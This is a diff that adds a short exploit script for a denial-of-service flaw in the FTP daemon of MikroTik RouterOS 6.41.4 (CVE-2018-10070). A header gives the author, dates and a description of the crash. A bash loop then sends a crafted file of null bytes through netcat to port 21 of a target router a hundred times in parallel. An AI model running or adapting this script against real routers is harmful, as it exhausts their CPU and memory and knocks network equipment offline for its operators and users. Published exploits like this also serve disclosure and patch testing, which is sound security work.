@@ -1,0 +1,19 @@
+################
+#Title: MikroTik 6.41.4 Denial of service FTP daemon crash
+#CVE: CVE-2018-10070
+#CWE: CWE-400
+#Exploit Author: Hosein Askari (FarazPajohan)
+#Vendor HomePage: https://mikrotik.com/
+#Version : 6.41.4 (Released 2018-Apr-05) | All Version
+#Date: 13-05-2018
+#Category: Network Appliance
+#Description: A vulnerability in MikroTik Version 6.41.4 could allow an unauthenticated remote attacker to exhaust all available CPU and all available RAM by sending crafted FTP requests on port 21 that begins with many '\0' characters, #preventing the affected router from accepting new FTP connections. The router will reboot after 10 minutes, logging a "router was rebooted without proper shutdown" message.
+#POC: https://vimeo.com/264461602
+################
+
+for i in `seq 1 100`
+
+do
+  cat craft |  nc -nv <MikroTik IP> 21 &
+  sleep 2
+done
